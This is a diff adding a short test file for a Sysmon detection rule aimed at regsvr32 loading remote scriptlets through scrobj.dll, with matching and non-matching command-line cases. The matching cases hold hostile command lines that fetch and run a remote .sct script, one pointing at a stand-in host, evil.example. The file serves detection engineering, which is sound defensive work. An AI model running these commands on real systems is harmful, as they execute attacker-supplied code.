@@ -1,0 +1,14 @@
+rule: proc_creation_regsvr32_remote_scriptlet
+base: {Channel: Microsoft-Windows-Sysmon/Operational, EventID: 1, Image: 'C:\Windows\System32\regsvr32.exe'}
+match:
+  - name: OTRF Empire sample
+    event: {CommandLine: '"C:\windows\system32\regsvr32.exe" /s /n /u /i:http://10.10.10.5:8444/launcher.sct scrobj.dll'}
+  - name: dash flag and https
+    event: {CommandLine: 'regsvr32 -s -n -u -i:https://evil.example/a.sct scrobj.dll'}
+  - name: UNC path
+    event: {CommandLine: 'regsvr32 /u /n /s /i:\\10.0.0.5\share\a.sct scrobj.dll'}
+no_match:
+  - name: normal DLL registration
+    event: {CommandLine: 'regsvr32.exe /s "C:\Program Files\Vendor\vendor.dll"'}
+  - name: scrobj with a local scriptlet
+    event: {CommandLine: 'regsvr32 /s /i:C:\Tools\inventory.sct scrobj.dll'}
